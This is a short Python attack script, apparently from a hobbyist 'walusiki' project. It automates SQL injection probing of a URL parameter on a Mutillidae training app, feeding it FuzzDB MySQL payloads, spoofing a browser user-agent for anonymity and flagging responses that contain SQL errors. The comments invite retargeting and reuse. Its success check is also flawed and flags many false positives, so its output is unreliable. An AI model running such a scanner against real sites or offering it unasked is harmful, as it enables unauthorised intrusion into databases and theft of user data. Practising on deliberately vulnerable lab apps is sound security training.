#################################
#        CodesInTheShell.........
#
#################################

import requests

#Printing a simple banner
print("""
#############################################
# This program is a part of walusiki project.
# Feel free to use and modify the code.
#
#                 by: CITS
#############################################
""")

# url varies depending on your target
url = 'http://192.168.142.128/mutillidae/index.php?page=user-info.php&username=BUFF&password=&user-info-php-submit-button=View+Account+Details'
#adding header for the request to became a bit anonymous
head = {'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'}

print("Program running...")
print("Performing SQL Injection on the value BUFF in " + url + "\n")

#Use to verify is SQL error is in the response page
error_page = ["error in your SQL"]

#Using the MySQL.txt from FUZZDB for injection
for buff in open("MySQL.txt", "r").readlines():
    #Replace the word BUFF in the url with the crafted word from MySQL.txt
    buffed_url = url.replace("BUFF", buff)
    #Trying the crafted URL
    r = requests.get(str(buffed_url))
    #Checking if error in your SQL is in the response page
    for err in error_page:
        if err in r.text:
            print("=================================================================================================")
            print("Possible injection with: " + buff)
            print(buffed_url + "\n")
        elif 'metasploit.accounts' not in r.text:
            print("Other Possible successful injection with: " + buff)




